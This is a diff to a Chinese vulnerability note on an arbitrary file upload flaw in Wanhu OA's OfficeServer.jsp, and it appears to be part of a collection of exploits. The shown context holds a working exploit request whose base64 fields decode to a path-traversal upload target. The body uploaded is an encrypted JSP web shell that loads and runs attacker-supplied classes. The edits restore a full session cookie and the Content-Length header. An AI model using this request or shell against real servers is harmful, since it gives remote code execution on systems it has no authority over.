@@ -40,7 +40,7 @@ schema_version: "1"
 
 ## 操作风险
 
-文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -78,12 +78,13 @@ User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
-Cookie: OASESSIONID=847AE3A2E5D155AE7FB1CD2C6
+Cookie: OASESSIONID=847AE3A2E5D155AE7FB1CD2C6736CD66
 x-forwarded-for: 127.0.0.1
 x-originating-ip: 127.0.0.1
 x-remote-ip: 127.0.0.1
 x-remote-addr: 127.0.0.1
 Connection: close
+Content-Length: 798
 		
 DBSTEP V3.0     170              0                1000              DBSTEP=REJTVEVQ
 OPTION=U0FWRUZJTEU=
@@ -95,7 +96,7 @@ FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw
 <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
 ```
 
-> 请求长度说明：原资料 Content-Length 为 798；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 798；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![image-20220824142511911](./.resource/万户OA-OfficeServer.jsp-任意文件上传漏洞/media/202208241425970.png)
 
